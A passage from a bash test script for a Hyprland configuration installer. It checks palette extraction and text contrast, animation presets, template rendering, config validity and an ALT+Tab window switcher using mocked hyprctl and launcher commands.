auto_lang = values_for("gruvbox-material")
auto_lang["HYPR_LANG"] = "auto"
written = applier().apply(auto_lang, selected).written
if not (config_home / hypr_rel).is_file():
    problems.append(f"with HYPR_LANG=auto {hypr_rel} was never generated")
else:
    text = (config_home / hypr_rel).read_text().lower()
    if accent not in text and bg not in text:
        problems.append(f"{hypr_rel} does not carry the new palette (border/shadow "
                        "keep the old colors)")

# 4. THEME="auto" must really extract from the wallpaper
run.apply(values_for("hyde"), selected)          # THEME="auto"
text = (config_home / hypr_rel).read_text()
found = re.findall(r"rgba\(([0-9a-f]{6})[0-9a-f]{2}\)", text)
default_accent = themes.THEMES[themes.DEFAULT]["ACCENT"][:6].lower()
if not found:
    problems.append(f"no color found in {hypr_rel}")
elif found[0] == default_accent:
    problems.append("THEME=auto fell back to the default palette — extraction "
                    "from the wallpaper is not working")

# 5. The Firefox theme must be distributed to profiles
profile_dir = sandbox / ".mozilla/firefox/test.default"
profile_dir.mkdir(parents=True, exist_ok=True)
(sandbox / ".mozilla/firefox/profiles.ini").write_text(
    "[Profile0]\nName=default\nIsRelative=1\nPath=test.default\n")
values = values_for("rose-pine-soft")
run.apply(values, list(selected) + ["firefox-theme"])
source = config_home / "hyprsetup/firefox/userChrome.css"
if not source.is_file():
    problems.append("userChrome.css not generated")
else:
    target = profile_dir / "chrome/userChrome.css"
    if not target.is_file():
        problems.append("userChrome.css not copied into the Firefox profile")
    elif target.read_bytes() != source.read_bytes():
        problems.append("theme in the Firefox profile is not up to date")
    user_js = profile_dir / "user.js"
    if (not user_js.is_file()
            or "legacyUserProfileCustomizations" not in user_js.read_text()):
        problems.append("user.js pref not written — Firefox will not read "
                        "userChrome.css")

print("\n".join(problems))
COLOREOF
)
    if [[ -n "$color_out" ]]; then
        fail "profile colors applied everywhere" "$color_out"$'\n'
    else
        pass "profile colors applied everywhere"
    fi

    # THEME="auto" palette extraction: all 11 keys must be produced for every
    # wallpaper and text must be readable against the background. The contrast
    # check is the really valuable one — an unreadable palette is a silent failure.
    palette_out=$(PYTHONPATH=python python3 - <<'PY'
from pathlib import Path
from hyprsetup import palette, themes

problems = []
checked = 0
for image in sorted(Path("wallpapers").glob("*.png")):
    result = palette.extract(image, dark=True, backend="python")
    if result is None:
        problems.append(f"{image.name}: extraction failed")
        continue
    checked += 1
    missing = [k for k in themes.KEYS if k not in result]
    if missing:
        problems.append(f"{image.name}: missing keys {missing}")
    for key, value in result.items():
        if len(value) != 6 or any(c not in "0123456789abcdef" for c in value):
            problems.append(f"{image.name}: {key} invalid hex {value!r}")
    bg = palette._hex_to_rgb(result["BG"])
    for key, minimum in (("FG", 4.5), ("SUBTEXT", 3.0), ("ACCENT", 3.0)):
        ratio = palette._contrast(palette._hex_to_rgb(result[key]), bg)
        if ratio < minimum - 0.05:
            problems.append(f"{image.name}: {key}/BG contrast {ratio:.2f} < {minimum}")

print(f"__CHECKED__{checked}")
print("\n".join(problems))
PY
)
    palette_count=$(printf '%s' "$palette_out" | sed -n 's/^__CHECKED__//p')
    palette_problems=$(printf '%s' "$palette_out" | grep -v '^__CHECKED__' | grep . || true)
    if [[ -n "$palette_problems" ]]; then
        fail "palette extraction + contrast (auto theme)" "$palette_problems"$'\n'
    else
        pass "palette extraction + contrast ($palette_count wallpapers)"
    fi

    # The check above does NOT ACTUALLY EXERCISE _enforce_readability: the _compose
    # targets (BG lightness 0.085 · FG 0.90) already produce high contrast, so the
    # safety net never fires. But that net is critical on the matugen path — there
    # colors come from outside and are not forced onto our lightness scale. So
    # _ensure_contrast is tested directly, with deliberately unreadable pairs.
    contrast_out=$(PYTHONPATH=python python3 - <<'PY'
from hyprsetup import palette

problems = []
# (fg, bg, minimum ratio wanted) — all unreadable to start with.
cases = [
    ("333333", "2b2b2b", 4.5),   # dark on dark
    ("eeeeee", "f0f0f0", 4.5),   # light on light
    ("8b7bd8", "6a5acd", 4.5),   # two neighboring values of the same hue
    ("ff0000", "000000", 7.0),   # already passes but a higher ratio is wanted
]
for fg, bg, minimum in cases:
    before = palette._contrast(palette._hex_to_rgb(fg), palette._hex_to_rgb(bg))
    fixed = palette._ensure_contrast(fg, bg, minimum)
    after = palette._contrast(palette._hex_to_rgb(fixed), palette._hex_to_rgb(bg))
    if after < minimum - 0.01:
        problems.append(f"#{fg} / #{bg}: {before:.2f} -> {after:.2f}, "
                        f"target {minimum} not reached (#{fixed})")

print("\n".join(problems))
PY
)
    if [[ -n "$contrast_out" ]]; then
        fail "_ensure_contrast fixes unreadable pairs" "$contrast_out"$'\n'
    else
        pass "_ensure_contrast fixes unreadable pairs (4 cases)"
    fi

    # Animation presets: every preset must render in both .conf and Lua, and
    # every animation line must reference a valid curve. An undefined curve
    # name invalidates the whole animations block in Hyprland.
    anim_out=$(PYTHONPATH=python python3 - <<'PY'
from hyprsetup import render

problems = []
for name, preset in render.ANIMATION_PRESETS.items():
    curve_names = {c[0] for c in preset["curves"]}
    for leaf, duration, curve, _style in preset["animations"]:
        if curve not in curve_names:
            problems.append(f"{name}: '{leaf}' references an undefined curve: {curve}")
        if duration <= 0:
            problems.append(f"{name}: '{leaf}' invalid duration: {duration}")
    for lang in ("conf", "lua"):
        lines = render._animation_lines(
            {"ANIMATION_PRESET": name, "ANIMATION_SPEED": "1.0"}, lang)
        if not lines:
            problems.append(f"{name}/{lang}: no lines generated")
        # The speed multiplier must produce a duration of at least 1 at the extremes too (0 = Hyprland error).
        for speed in ("0.3", "3.0", "10"):
            out = render._animation_lines(
                {"ANIMATION_PRESET": name, "ANIMATION_SPEED": speed}, lang)
            for line in out:
                if lang == "conf" and line.strip().startswith("animation ="):
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) > 2 and parts[2] == "0":
                        problems.append(
                            f"{name}/{lang} speed={speed}: zero duration generated: {line.strip()}")

# An invalid name must fall back to the default, not blow up.
if render.resolve_animation_preset("bogus") != render.DEFAULT_ANIMATION_PRESET:
    problems.append("invalid preset name does not fall back to the default")
if render.resolve_animation_preset("") != render.DEFAULT_ANIMATION_PRESET:
    problems.append("empty preset name does not fall back to the default")

print("\n".join(problems))
PY
)
    if [[ -n "$anim_out" ]]; then
        fail "animation presets consistent" "$anim_out"$'\n'
    else
        pass "animation presets consistent (5 presets × 2 languages × 3 speeds)"
    fi
fi

# =========================================================  render  =========
if want render && ((!QUICK)); then
    group "Render matrix"

    # config.sh/preset.sh are only needed here; loaded at this point to avoid
    # polluting the lint group's environment.
    STATE_DIR="$TMP_ROOT/state"; mkdir -p "$STATE_DIR"
    # shellcheck source=../lib/core.sh
    source lib/core.sh
    # shellcheck source=../lib/config.sh
    source lib/config.sh
    # shellcheck source=../lib/preset.sh
    source lib/preset.sh
    # shellcheck source=../lib/packages.sh
    source lib/packages.sh
    # shellcheck source=../lib/render.sh
    source lib/render.sh

    # core.sh's ERR trap short-circuits this script's own error reporting
    # (exit on the first failing check). Not wanted in the test runner.
    trap - ERR

    CATALOG="$SETUP_ROOT/config/components.json"
    DRY_RUN=1          # make _render_component_installed skip the package check
    export DRY_RUN

    mapfile -t SELECTED < <(catalog_profile_ids standard)
    mapfile -t ALL_PRESETS < <(preset_names)

    resolve_primaries() {
        local cat var id
        while IFS= read -r cat; do
            var=$(catalog_category_var "$cat")
            [[ -z "$var" ]] && continue
            while IFS= read -r id; do
                if in_list "$id" "${SELECTED[@]}"; then
                    printf -v "$var" '%s' "$id"; export "${var?}"; break
                fi
            done < <(jq -r --arg c "$cat" '.categories[]|select(.id==$c)|.components[].id' "$CATALOG")
        done < <(catalog_category_ids)
    }

    # Bar preset render: also carries the backend the preset wants
    # (BAR=hyprpanel/quickshell-bar) into SELECTED — in install.sh this is done by
    # selection_sync_bar_component. Without it the hyprpanel/quickshell templates are
    # never generated and the test says "all good" (see §2b/§2c, docs/gallery-catalog.md).
    bar_render_one() {
        local bar="$1" dest="$2"
        (
            set -Eeuo pipefail
            unset "${CONFIG_VARS[@]}" 2>/dev/null || true
            # shellcheck disable=SC2034  # read in another file (sourced library)
            CLI_BAR_PRESET="$bar"
            config_load "" >/dev/null 2>&1
            config_validate >/dev/null 2>&1
            local backend id kept=()
            # preset_file's signature is <name> <kind>; it used to be called with
            # the arguments reversed, so the file was never found, backend stayed
            # empty and the preset's backend (hyprpanel/quickshell-bar) never reached the selection.
            backend=$(preset_value "$(preset_file "$bar" bar)" "BAR")
            if [[ -n "$backend" ]]; then
                for id in "${SELECTED[@]}"; do
                    [[ "$(catalog_category_of "$id")" == "bar" ]] && continue
                    kept+=("$id")
                done
                SELECTED=("${kept[@]}" "$backend")
            fi
            resolve_primaries
            MONITOR_SPEC=",preferred,auto,1"
            WORKSPACE_MONITOR_MAP=""
            HYPR_LANG="conf"
            local vars="$TMP_ROOT/bar-$bar.env"
            render_export_vars >"$vars"
            mkdir -p "$dest"
            PYTHONPATH="$SETUP_ROOT/python" python3 -m hyprsetup render \
                --catalog "$CATALOG" --templates "$SETUP_ROOT/templates" \
                --vars "$vars" --selected "$(join_by , "${SELECTED[@]}")" \
                --keybinds "$SETUP_ROOT/config/keybinds.json" \
                --strict --out "$dest" >/dev/null
        )
    }

    # Terminal/launcher preset render: one of the category's programs is put
    # into the selection and the preset is generated with that program.
    axis_render_one() {
        local axis="$1" app="$2" preset="$3" dest="$4"
        (
            set -Eeuo pipefail
            unset "${CONFIG_VARS[@]}" 2>/dev/null || true
            # shellcheck disable=SC2034  # CLI_*_PRESET: read by lib/preset.sh
            case "$axis" in
                terminal) CLI_TERM_PRESET="$preset" ;;
                launcher) CLI_LAUNCHER_PRESET="$preset" ;;
            esac
            local id kept=()
            for id in "${SELECTED[@]}"; do
                [[ "$(catalog_category_of "$id")" == "$axis" ]] && continue
                kept+=("$id")
            done
            SELECTED=("${kept[@]}" "$app")
            config_load "" >/dev/null 2>&1
            config_validate >/dev/null 2>&1
            resolve_primaries
            MONITOR_SPEC=",preferred,auto,1"
            WORKSPACE_MONITOR_MAP=""
            HYPR_LANG="conf"
            local vars="$TMP_ROOT/axis-$axis-$app-$preset.env"
            render_export_vars >"$vars"
            mkdir -p "$dest"
            PYTHONPATH="$SETUP_ROOT/python" python3 -m hyprsetup render \
                --catalog "$CATALOG" --templates "$SETUP_ROOT/templates" \
                --vars "$vars" --selected "$(join_by , "${SELECTED[@]}")" \
                --keybinds "$SETUP_ROOT/config/keybinds.json" \
                --strict --out "$dest" >/dev/null
        )
    }

    render_one() {
        local preset="$1" dest="$2" lang="${3:-conf}"
        (
            set -Eeuo pipefail
            unset "${CONFIG_VARS[@]}" 2>/dev/null || true
            # shellcheck disable=SC2034  # read in another file (sourced library)
            CLI_PRESET="$preset"
            config_load "" >/dev/null 2>&1
            config_validate >/dev/null 2>&1
            resolve_primaries
            # shellcheck disable=SC2034  # read in another file (sourced library)
            MONITOR_SPEC=",preferred,auto,1"
            # shellcheck disable=SC2034  # read in another file (sourced library)
            WORKSPACE_MONITOR_MAP=""
            # shellcheck disable=SC2034  # read in another file (sourced library)
            HYPR_LANG="$lang"
            local vars="$TMP_ROOT/${preset:-default}-$lang.env"
            render_export_vars >"$vars"
            mkdir -p "$dest"
            PYTHONPATH="$SETUP_ROOT/python" python3 -m hyprsetup render \
                --catalog "$CATALOG" --templates "$SETUP_ROOT/templates" \
                --vars "$vars" --selected "$(join_by , "${SELECTED[@]}")" \
                --keybinds "$SETUP_ROOT/config/keybinds.json" \
                --strict --out "$dest" >/dev/null
        )
    }

    # Can every preset be rendered, and is the output clean?
    #
    # Note: checking "is there a {{ left in the generated file" DOES NOT WORK — the
    # engine silently turns an undefined variable into an empty string
    # (render.py:_substitute), so a typo like {{ROUNDNG}} leaves no trace in the
    # output, it just drops the setting. render --strict is used instead: the engine
    # reports a template referencing an undefined name and exits 1 (render_one catches it).
    render_failed=""; brace_failed=""; empty_failed=""
    rendered_count=0
    # While presets/profile/ is empty (the profile system is being rewritten, see
    # presets/profile/.gitkeep) this loop would never run and template coverage
    # would drop entirely — a test passing with "0/0 presets" verifies nothing.
    # An empty preset name means CLI_PRESET="" in render_one: config_load
    # applies no preset, i.e. it renders once with lib/config.sh's
    # defaults. When profiles come back this line disables itself
    # automatically.
    ((${#ALL_PRESETS[@]})) || ALL_PRESETS=("")
    for preset in "${ALL_PRESETS[@]}"; do
        dest="$TMP_ROOT/render/${preset:-default}"
        if ! err_out=$(render_one "$preset" "$dest" 2>&1); then
            render_failed+="${preset:-default}: $err_out"$'\n'
            continue
        fi
        rendered_count=$((rendered_count + 1))

        # hyprland.conf braces must be balanced.
        hc="$dest/hypr/hyprland.conf"
        if [[ -f "$hc" ]]; then
            opens=$(tr -cd '{' <"$hc" | wc -c)
            closes=$(tr -cd '}' <"$hc" | wc -c)
            [[ "$opens" == "$closes" ]] || \
                brace_failed+="$preset: hyprland.conf { =$opens } =$closes"$'\n'
        else
            render_failed+="$preset: hypr/hyprland.conf not generated"$'\n'
        fi

        # No zero-byte files may be generated.
        while IFS= read -r empty; do
            empty_failed+="$preset: $(basename "$empty") empty"$'\n'
        done < <(find "$dest" -type f -empty)
    done

    if [[ -n "$render_failed" ]]; then
        fail "render + undefined variable check (${#ALL_PRESETS[@]} presets)" "$render_failed"
    else
        pass "render + undefined variable check ($rendered_count/${#ALL_PRESETS[@]} presets)"
    fi

    # HYPR_LANG=lua: the templates/hypr-lua/ tree was NEVER rendered in the matrix
    # above (all three render paths pin HYPR_LANG="conf"), so a typo or undefined
    # variable in those templates showed up in no test. The luac and Hyprland
    # validations below also take this tree from
    # here.
    if err_out=$(render_one "" "$TMP_ROOT/render-lua/default" lua 2>&1); then
        pass "Lua mode render (HYPR_LANG=lua)"
    else
        fail "Lua mode render (HYPR_LANG=lua)" "$err_out"$'\n'
    fi

    # Bar presets were not part of the profile matrix: only bar presets used by a
    # profile were rendered, those chosen directly with --bar-preset were never
    # tried. Most HyprPanel/Quickshell presets (and the vertical Quickshell
    # rail) appear in no profile.
    mapfile -t ALL_BARS < <(preset_names bar)
    bar_failed=""; bar_count=0
    for bar in "${ALL_BARS[@]}"; do
        dest="$TMP_ROOT/render-bar/$bar"
        if err_out=$(bar_render_one "$bar" "$dest" 2>&1); then
            bar_count=$((bar_count + 1))
        else
            bar_failed+="$bar: $err_out"$'\n'
        fi
    done
    if [[ -n "$bar_failed" ]]; then
        fail "bar presets render (${#ALL_BARS[@]} presets)" "$bar_failed"
    else
        pass "bar presets render ($bar_count/${#ALL_BARS[@]} presets)"
    fi

    # Terminal and launcher presets × EVERY program in that category: presets
    # are program-independent, so the real risk is in the translation (e.g.
    # Ghostty's scrollback limit in bytes, Alacritty's capitalized cursor name).
    # Rendering with a single program would never try three of those translations.
    axis_failed=""; axis_count=0; axis_total=0
    for axis in terminal launcher; do
        mapfile -t axis_presets < <(preset_names "$axis")
        mapfile -t axis_apps < <(jq -r --arg c "$axis" \
            '.categories[]|select(.id==$c)|.components[].id' "$CATALOG")
        for app in "${axis_apps[@]}"; do
            for preset in "${axis_presets[@]}"; do
                axis_total=$((axis_total + 1))
                dest="$TMP_ROOT/render-axis/$axis-$app-$preset"
                if err_out=$(axis_render_one "$axis" "$app" "$preset" "$dest" 2>&1); then
                    axis_count=$((axis_count + 1))
                else
                    axis_failed+="$axis/$app/$preset: $err_out"$'\n'
                fi
            done
        done
    done
    if [[ -n "$axis_failed" ]]; then
        fail "terminal/launcher presets render ($axis_total combinations)" "$axis_failed"
    else
        pass "terminal/launcher presets render ($axis_count/$axis_total combinations)"
    fi
    [[ -n "$brace_failed" ]] && fail "hyprland.conf brace balance" "$brace_failed" \
        || pass "hyprland.conf brace balance"

    # Does the generated config pass Hyprland's OWN parser?
    # A misspelled option name or a nonexistent window rule
    # (e.g. "windowrule = animation …") shows up in neither the bash nor the JSON check;
    # it appears as a "config error" when the user logs in. --verify-config
    # only parses without running Hyprland, so it is safe in a test.
    #
    # HOME is moved to a temp dir: hyprland.conf sources its siblings via
    # "~/.config/hypr/…"; with the real HOME the user's OWN files would be
    # validated. The placeholders left by the installer's hook_hyprland
    # (modules/hypr.sh) are created here too — without them source fails and
    # the test reports a problem that does not exist.
    if ! command -v Hyprland >/dev/null 2>&1; then
        skip "generated config valid per Hyprland" "Hyprland not installed"
    else
        hl_lang=$(PYTHONPATH=python python3 -c '
from pathlib import Path
from hyprsetup.apply import Applier
from hyprsetup.catalog import Catalog
print(Applier(Path("."), Catalog.load("config/components.json")).resolve_hypr_lang("auto"))')
        hl_bad=""; hl_count=0
        for tree in "$TMP_ROOT/render"/*/ "$TMP_ROOT/render-lua"/*/; do
            [[ -d "$tree/hypr" ]] || continue
            # NOTE: "[[ cond ]] && assignment" is not used — when the condition is false
            # the list returns 1 and set -e silently kills the whole group (the same
            # trap is noted in install.sh's summary_step).
            entry=""
            if [[ -f "$tree/hypr/hyprland.conf" ]]; then
                # Hyprland 0.57+ removed the .conf parser and only parses Lua.
                [[ "$hl_lang" == "lua" ]] && continue
                entry="hyprland.conf"
            elif [[ -f "$tree/hypr/hyprland.lua" ]]; then
                entry="hyprland.lua"
            else
                continue
            fi
            hl_home="$TMP_ROOT/hl-verify/$(basename "$tree")-${entry##*.}"
            rm -rf "$hl_home"
            mkdir -p "$hl_home/.config"
            cp -a "$tree/hypr" "$hl_home/.config/hypr"
            for placeholder in monitors.conf workspaces.conf custom.conf \
                               hyprland/monitors.lua hyprland/workspaces.lua \
                               custom.lua; do
                if [[ ! -e "$hl_home/.config/hypr/$placeholder" ]]; then
                    mkdir -p "$(dirname "$hl_home/.config/hypr/$placeholder")"
                    : >"$hl_home/.config/hypr/$placeholder"
                fi
            done
            hl_count=$((hl_count + 1))
            # "|| true" is required: Hyprland returns nonzero on a bad config,
            # with pipefail the pipe fails too and set -e would abort the test
            # WITHOUT REPORTING — i.e. a broken rule would look like it "silently passed".
            # Without session variables: --verify-config really runs "exec ="
            # lines; they must not reach the open session.
            hl_out=$( { env -u HYPRLAND_INSTANCE_SIGNATURE -u WAYLAND_DISPLAY \
                            -u DISPLAY -u DBUS_SESSION_BUS_ADDRESS \
                            HOME="$hl_home" timeout 60 Hyprland --verify-config \
                            -c "$hl_home/.config/hypr/$entry" 2>&1 \
                        | sed -n '/parsing result/,$p'; } || true)
            if [[ "$hl_out" != *"config ok"* ]]; then
                hl_bad+="$(basename "$tree")/$entry:"$'\n'"$hl_out"$'\n'
            fi
        done
        if [[ -n "$hl_bad" ]]; then
            fail "generated config valid per Hyprland" "$hl_bad"
        else
            pass "generated config valid per Hyprland ($hl_count trees)"
        fi
    fi
    [[ -n "$empty_failed" ]] && fail "no empty files generated" "$empty_failed" \
        || pass "no empty files generated"

    # Are the generated JSON/JSONC files valid? (jsonc comments are stripped)
    if command -v jq >/dev/null 2>&1; then
        json_out_bad=""
        while IFS= read -r f; do
            sed 's://.*$::' "$f" | jq empty 2>/dev/null || \
                json_out_bad+="${f#"$TMP_ROOT/render/"}"$'\n'
            # render-bar is scanned too: HyprPanel's single-file config.json
            # is only generated with bar presets.
        done < <(find "$TMP_ROOT/render" "$TMP_ROOT/render-bar" \
                      \( -name '*.json' -o -name '*.jsonc' \) | sort)
        if [[ -n "$json_out_bad" ]]; then
            fail "generated JSON valid" "$json_out_bad"
        else
            pass "generated JSON valid"
        fi
    fi

    # Terminal emulators want a MONOSPACE font. FONT_FAMILY (the UI font) may
    # be proportional — its default "Noto Sans" is — and if passed to the
    # terminal, kitty prints a warning and falls back to another font, breaking
    # alignment. Before this split was added, 40 of 48 profiles were like this.
    prop_font=""
    while IFS= read -r f; do
        # Only look at font lines; a name mentioned in comments is fine.
        if grep -iE '^[[:space:]]*(font_family|font|font-family)[[:space:]=]' "$f" 2>/dev/null \
             | grep -qiE '(Noto Sans|Cantarell|DejaVu Sans|Liberation Sans|Ubuntu)([^ M]|$)'; then
            prop_font+="${f#"$TMP_ROOT/render/"}"$'\n'
        fi
    done < <(find "$TMP_ROOT/render" \( -name 'kitty.conf' -o -name 'foot.ini' \
                 -o -name 'alacritty.toml' -o -path '*ghostty/config' \) | sort)
    if [[ -n "$prop_font" ]]; then
        fail "terminal font is monospace" "$prop_font"
    else
        pass "terminal font is monospace"
    fi

    # Are the generated scripts syntactically valid?
    gen_sh_bad=""
    while IFS= read -r f; do
        out=$(bash -n "$f" 2>&1) || gen_sh_bad+="${f#"$TMP_ROOT/render/"}: $out"$'\n'
    done < <(find "$TMP_ROOT/render" -name '*.sh' | sort)
    if [[ -n "$gen_sh_bad" ]]; then
        fail "generated scripts valid" "$gen_sh_bad"
    else
        pass "generated scripts valid"
    fi

    # Generated Python scripts must compile too (bar-autohide.py,
    # windowswitch.py): bash -n never saw them, so a broken template
    # would only surface when the user pressed the shortcut.
    gen_py_bad=""
    while IFS= read -r f; do
        out=$(python3 -m py_compile "$f" 2>&1) || gen_py_bad+="${f#"$TMP_ROOT/render/"}: $out"$'\n'
    done < <(find "$TMP_ROOT/render" "$TMP_ROOT/render-lua" -name '*.py' 2>/dev/null | sort)
    if [[ -n "$gen_py_bad" ]]; then
        fail "generated Python scripts valid" "$gen_py_bad"
    else
        pass "generated Python scripts valid"
    fi

    # Does the ALT+Tab window switcher REALLY call the right window?
    # The key point is the behavior the user wants: when a window on another
    # workspace is selected, "hyprctl dispatch focuswindow" must be sent to it
    # (Hyprland switches to that workspace itself). hyprctl and the launcher
    # are mocked, so the test needs no running session.
    switch_src=$(find "$TMP_ROOT/render" -name 'windowswitch.py' | head -1)
    if [[ -z "$switch_src" ]]; then
        fail "window switcher calls the right window" \
             "windowswitch.py was never generated"$'\n'
    else
        sw="$TMP_ROOT/switcher"; rm -rf "$sw"; mkdir -p "$sw/bin"
        # The generated script is in "overlay" mode by default: it opens the
        # GTK window with thumbnails. To measure the plain-list logic a copy
        # switched to menu mode is used; the switch to overlay itself is
        # tested separately below.
        sed 's/^MODE = "overlay"/MODE = "menu"/' "$switch_src" \
            >"$sw/windowswitch.py"
        # focusHistoryID: 0 = focused window, 1 = the one before it.
        cat >"$sw/clients.json" <<'CLIENTS'
[{"address":"0xAAA","mapped":true,"class":"kitty","title":"terminal","monitor":0,
  "workspace":{"id":1,"name":"1"},"focusHistoryID":2},
 {"address":"0xBBB","mapped":true,"class":"steam","title":"Steam","monitor":0,
  "workspace":{"id":5,"name":"5"},"focusHistoryID":5},
 {"address":"0xCCC","mapped":true,"class":"vesktop","title":"Discord","monitor":1,
  "workspace":{"id":6,"name":"6"},"focusHistoryID":1},
 {"address":"0xDDD","mapped":true,"class":"zen","title":"Claude","monitor":0,
  "workspace":{"id":3,"name":"3"},"focusHistoryID":0},
 {"address":"0xEEE","mapped":true,"class":"scratch","title":"hidden","monitor":0,
  "workspace":{"id":-99,"name":"special:magic"},"focusHistoryID":4}]
CLIENTS
        cat >"$sw/bin/hyprctl" <<'HYPRCTL'
#!/usr/bin/env bash
root="$(dirname "$0")/.."
if [[ "${1:-}" == "-j" ]]; then
    case "${2:-}" in
        clients)         cat "$root/clients.json" ;;
        activeworkspace) printf '{"id":3,"name":"3"}' ;;
        monitors)        printf '[{"id":0,"focused":true},{"id":1,"focused":false}]' ;;
    esac
    exit 0
fi
printf '%s\n' "$*" >>"$root/dispatched.txt"
HYPRCTL
        # Launcher mock: picks line PICK of the list and saves the list.
        for launcher in wofi rofi fuzzel tofi walker; do
            cat >"$sw/bin/$launcher" <<'LAUNCHER'
#!/usr/bin/env bash
root="$(dirname "$0")/.."
mapfile -t lines
printf '%s\n' "${lines[@]}" >"$root/list.txt"
printf '%s\n' "${lines[$(( ${PICK:-1} - 1 ))]}"
LAUNCHER
        done
        printf '#!/bin/sh\nexit 0\n' >"$sw/bin/notify-send"
        chmod 755 "$sw/bin"/*

        sw_problems=""
        # XDG_RUNTIME_DIR is the test's own dir: the lock file must not be
        # shared with the real switcher open in the developer's session — when
        # shared, the script said "a switcher is already running" and did nothing.
        run_switch() {   # <PICK> [arg]  -> prints the dispatched address
            : >"$sw/dispatched.txt"
            rm -f "$sw/hyprsetup-switcher.pid" "$sw/hyprsetup-switcher.queue"
            XDG_RUNTIME_DIR="$sw" HYPRSETUP_PYTHON="$sw/noapp" \
                PATH="$sw/bin:$PATH" PICK="$1" \
                python3 "$sw/windowswitch.py" ${2:+"$2"} >/dev/null 2>&1 || true
            sed -n 's/.*address://p' "$sw/dispatched.txt"
        }
        mkdir -p "$sw/noapp"
        # Row 1 must be the "previous window" (MRU): focusHistoryID=1 → 0xCCC.
        got=$(run_switch 1)
        [[ "$got" == "0xCCC" ]] || \
            sw_problems+="first row should have been the previous window (0xCCC), got: '$got'"$'\n'
        # Row 3: CCC(1), AAA(2), BBB(5) → 0xBBB. The focused window is last.
        got=$(run_switch 3)
        [[ "$got" == "0xBBB" ]] || \
            sw_problems+="third row should have been 0xBBB, got: '$got'"$'\n'
        # "last" mode goes to the previous window without opening the list.
        got=$(run_switch 1 last)
        [[ "$got" == "0xCCC" ]] || \
            sw_problems+="'last' mode should have gone to 0xCCC, got: '$got'"$'\n'
        # Special (scratchpad) windows are not listed by default.
        if grep -q 'scratch' "$sw/list.txt" 2>/dev/null; then
            sw_problems+="window on a special: workspace got into the list"$'\n'
        fi
        # The list must show every window with its workspace (SHOW_WORKSPACE).
        if ! grep -q '^\[6\] vesktop' "$sw/list.txt" 2>/dev/null; then
            sw_problems+="row format is not '[workspace] class':"$'\n'
            sw_problems+="$(cat "$sw/list.txt")"$'\n'
        fi
        # overlay mode: the script does not draw a list itself, it runs the
        # installed app ("hyprsetup switcher"). Without the app it must fall
        # back to the plain list — the shortcut must never end up dead.
        cp "$switch_src" "$sw/windowswitch-overlay.py"
        cat >"$sw/bin/hyprsetup" <<'HYPRSETUP'
#!/usr/bin/env bash
printf '%s\n' "$*" >"$(dirname "$0")/../overlay.txt"
HYPRSETUP
        chmod 755 "$sw/bin/hyprsetup"
        : >"$sw/overlay.txt"
        # HYPRSETUP_PYTHON points to an empty dir: the script must not be able
        # to import the installed app IN-PROCESS, so we can measure the
        # command-line fallback (otherwise the test would open the real switcher window).
        rm -f "$sw/hyprsetup-switcher.pid" "$sw/hyprsetup-switcher.queue"
        XDG_RUNTIME_DIR="$sw" HYPRSETUP_PYTHON="$sw/noapp" PATH="$sw/bin:$PATH" \
            python3 "$sw/windowswitch-overlay.py" >/dev/null 2>&1 || true
        if [[ "$(cat "$sw/overlay.txt" 2>/dev/null)" != "switcher" ]]; then
            sw_problems+="overlay mode did not call 'hyprsetup switcher': "
            sw_problems+="'$(cat "$sw/overlay.txt" 2>/dev/null)'"$'\n'
        fi
        # Does it fall back to the plain list when the app is not on PATH? PATH
        # is deliberately narrowed (system dirs + mocks): if a real installed
        # "hyprsetup" were found the test would open the real window.
        rm -f "$sw/bin/hyprsetup" "$sw/list.txt" \
              "$sw/hyprsetup-switcher.pid" "$sw/hyprsetup-switcher.queue"
        XDG_RUNTIME_DIR="$sw" HYPRSETUP_PYTHON="$sw/noapp" \
            PATH="$sw/bin:/usr/bin:/bin" PICK=1 \
            python3 "$sw/windowswitch-overlay.py" >/dev/null 2>&1 || true
        if [[ ! -s "$sw/list.txt" ]]; then
            sw_problems+="did not fall back to the plain list without the app"$'\n'
        fi
        if [[ -n "$sw_problems" ]]; then
            fail "window switcher calls the right window" "$sw_problems"
        else
            pass "window switcher calls the right window (6 cases)"
        fi

        # --- a second ALT+Tab must NOT OPEN a new window -----------------
        # This was the real bug: the lock was only written after GTK loaded
        # (~110 ms); pressing Tab twice quickly while holding ALT started TWO
        # switchers, and while one made a selection and closed, the other stayed
        # hanging on its workspace. Now the script itself takes the lock
        # (execvp keeps the PID).
        lock_problems=""
        lockdir="$TMP_ROOT/switcher-lock"; rm -rf "$lockdir"; mkdir -p "$lockdir/bin"
        cp "$switch_src" "$lockdir/windowswitch.py"
        printf '1\n' >"$lockdir/ws.txt"
        cat >"$lockdir/bin/hyprctl" <<'LOCKHYPRCTL'
#!/usr/bin/env bash
root="$(dirname "$0")/.."
if [[ "${1:-}" == "-j" ]]; then
    case "${2:-}" in
        clients) printf '[{"address":"0xAAA","mapped":true,"class":"kitty","title":"t","monitor":0,"workspace":{"id":1,"name":"1"},"focusHistoryID":0,"stableId":"1"}]' ;;
        activeworkspace) printf '{"id":%s,"name":"%s"}' "$(cat "$root/ws.txt")" "$(cat "$root/ws.txt")" ;;
        monitors) printf '[{"id":0,"focused":true}]' ;;
    esac
fi
LOCKHYPRCTL
        # Mock of a slow-starting GTK app: keeps its PID (exec), catches USR1
        # and counts how many times it was called.
        cat >"$lockdir/bin/hyprsetup" <<'LOCKAPP'
#!/usr/bin/env bash
# Mock of a slow-starting GTK app: it just stays alive and records
# SIGTERM. The "advance the selection" request arrives via a counter file, not a
# signal (the real GTK app reads it every 40 ms).
root="$(dirname "$0")/.."
printf '%s\n' "$*" >>"$root/starts.txt"
trap 'printf "term\n" >>"$root/signals.txt"; exit 0' TERM
for _ in $(seq 100); do
    sleep 0.1
done
LOCKAPP
        chmod 755 "$lockdir/bin"/*
        : >"$lockdir/starts.txt"; : >"$lockdir/signals.txt"

        export XDG_RUNTIME_DIR_SAVE="${XDG_RUNTIME_DIR:-}"
        # Keep the lock file in the test's own dir so it does not mix with the
        # user's open switcher.
        mkdir -p "$lockdir/noapp"
        XDG_RUNTIME_DIR="$lockdir" HYPRSETUP_PYTHON="$lockdir/noapp" \
            PATH="$lockdir/bin:/usr/bin:/bin" \
            python3 "$lockdir/windowswitch.py" >/dev/null 2>&1 &
        first_pid=$!
        sleep 1.2
        XDG_RUNTIME_DIR="$lockdir" HYPRSETUP_PYTHON="$lockdir/noapp" \
            PATH="$lockdir/bin:/usr/bin:/bin" \
            timeout 5 python3 "$lockdir/windowswitch.py" >/dev/null 2>&1
        sleep 0.4
        if [[ "$(wc -l <"$lockdir/starts.txt")" != "1" ]]; then
